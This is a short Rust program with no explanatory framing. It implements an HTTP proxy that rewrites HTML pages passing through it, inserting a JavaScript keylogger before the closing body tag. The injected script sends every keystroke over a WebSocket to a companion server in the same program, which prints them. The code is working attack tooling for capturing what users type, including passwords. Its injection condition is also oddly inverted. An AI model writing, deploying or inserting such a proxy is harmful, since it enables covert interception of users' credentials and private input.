use hyper::{Body, Client, Request, Response, Server, header::{CONTENT_LENGTH, HeaderValue}, service::{make_service_fn, service_fn}};
use std::{net::TcpListener, thread::spawn};
use tungstenite::accept;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = ([127, 0, 0, 1], 3000).into();
    let service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(respond)) });
    let server = Server::bind(&addr).serve(service);
    println!("Listening on http://{}", addr);
    
    tokio::spawn(async move {
        server.await.unwrap();
    });

    println!("creating ws server");

    let ws_server = TcpListener::bind("127.0.0.1:8080")?;
    
    for socket in ws_server.incoming() {
        let socket  = socket?;
        spawn(move || {
            let mut websocket = accept(socket).unwrap();
            loop {
                let msg = websocket.read_message().unwrap();

                if msg.is_text() {
                    println!("{}", msg.to_text().unwrap());
                }
            }
        });
    }

    Ok(())
}

async fn respond(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
    let uri = req.uri();
    // println!("{}", uri);
    let client = Client::new();

    let mut res = client.get(uri.clone()).await?;

    // println!("{:?}", res.headers());

    if let Some(header) = res.headers().get("content-type") {
        if header.to_str().unwrap() != "text/html" {
            return Ok(res)
        }
    } else {
        let body = res.body_mut();

        let bytes = hyper::body::to_bytes(body).await?;
        let mut body_str = String::from_utf8(bytes.into_iter().collect()).unwrap();

        match body_str.find("</body>") {
            Some(index) => {
                body_str.insert_str(index-1, r#"
                    <script>
                    (() => {
                        const socket = new WebSocket("ws://localhost:8080");
                        document.onkeydown = (e) => {
                            socket.send(e.key);
                            console.log(e);
                        }
                    })()
                    </script>"#
                );
            },
            None => {}
        }

        res.headers_mut().insert(CONTENT_LENGTH, HeaderValue::from(body_str.bytes().len()));
        *res.body_mut() = Body::from(body_str);
    }

    Ok(res)
}